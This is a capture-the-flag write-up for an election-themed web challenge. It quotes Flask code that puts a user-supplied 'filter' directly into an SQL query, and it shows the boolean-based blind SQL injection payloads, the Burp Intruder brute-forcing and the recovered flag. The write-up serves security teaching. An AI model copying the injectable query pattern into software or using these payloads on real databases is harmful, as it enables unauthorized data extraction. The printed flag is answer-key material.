# The vibes are off - web

## Challenge

Sysadmins have reported that a large number of errors logs started to populate the backend database during the election. Can you find out how the attackers were hacking the database? I feel like an intern is behind this...

## Solve

Scanning the source code we can see our interns code in `database.py`:

```py
def get_citizens(self, filter):
    conn = self.get_connection()
    try:
        cursor = conn.cursor()
        # NOTE: This is too complicated. AI gave me a simpler query to use and I added some flexibility to the query. From: 10x Intern
        # cursor.execute("""
        #     SELECT c.citizen_id, c.name, c.address, c.dob,
        #            CASE WHEN v.citizen_id IS NOT NULL THEN 1 ELSE 0 END as has_voted
        #     FROM citizens c
        #     LEFT JOIN votes v ON c.citizen_id = v.citizen_id
        #     ORDER BY c.name
        # """)

        if "attach" in filter.lower():
            raise Exception("CTF Note: You don't need 'ATTACH' to solve the challenge")

        cursor.execute(f"""
            SELECT 
                c.citizen_id, 
                c.name, 
                c.address, 
                c.dob,
                COUNT(v.citizen_id) > 0 AS has_voted
            FROM citizens c
            LEFT JOIN votes v ON c.citizen_id = v.citizen_id
            {filter}
            GROUP BY c.citizen_id, c.name, c.address, c.dob
            ORDER BY c.name
        """)
```

The `filter` parameter is directly inserted into the query and is thus vulnerable to injection.

We can see how we can specify the `filter` parameter through the `/citizens` API endpoint in `admin_api.py`:

```py
@admin_bp.route("/citizens", methods=["POST"])
@require_polling_key
def get_citizens():
    """
    Retrieve list of all citizens with their voting status.
    """

    data = request.get_json()
    filter = ""
    if data:
        filter = data.get("filter")

    try:
        db = Database()
        citizens = db.get_citizens(filter)

        return jsonify({
            "citizens": citizens,
            "total": len(citizens)
        })

    except Exception as e:
        return jsonify({"error": f"Failed to retrieve citizens: {str(e)}"}), 500
```

We can see in `database_init.sql` that the flag is stored in a table named `the_vibes_are_off_flag`. Experimenting with different injections in the `filter` parameter, the attack vector I found was a boolean-based blind SQL attack.

Since we know the flag begins with `cysea`, we can confirm the query behaves as expected by checking if the first character is equal to `c`:

```json
{
  "filter": "WHERE (SELECT SUBSTR(the_vibes_are_off_flag, 1, 1) FROM flag) = 'c'"
}
```

`filter` is inserted into the source code to create the query: 

```sql
SELECT 
    c.citizen_id, 
    c.name, 
    c.address, 
    c.dob,
    COUNT(v.citizen_id) > 0 AS has_voted
FROM citizens c
LEFT JOIN votes v ON c.citizen_id = v.citizen_id
WHERE (SELECT SUBSTR(the_vibes_are_off_flag, 1, 1) FROM flag) = 'c'
GROUP BY c.citizen_id, c.name, c.address, c.dob
ORDER BY c.name;
```

The query evaluates to true as we expect and we can see results are returned:

vibes

If we change the letter to anything but `c`, empty results are returned since the query evaluates to false:

vibes1

So, if we brute force this for every letter and number, we can slowly start to build the flag. I achieved this by using the Intruder in BurpSuite and creating a basic alphanumeric list, then sending multiple requests and filtering responses by length to identify matched characters.

- First we brute force the overall length of the flag and find this `filter` injection evaluates to true:

```SQL
"WHERE (SELECT LENGTH(the_vibes_are_off_flag) FROM flag) = 47"
```

The flag is 47 characters long. Fortunately, portions of the flag are known (i.e `cysea{...}`) and others became guessable as the flag revealed itself. It took around 20 minutes for me to build the full flag:

vibes3.png

We can see in the image above that the last character in the flag was a `2`, since the length was greater than all other characters inserted into the query.

`cysea{sqli_in_2025_is_still_a_thing_bec66fc8a2}`









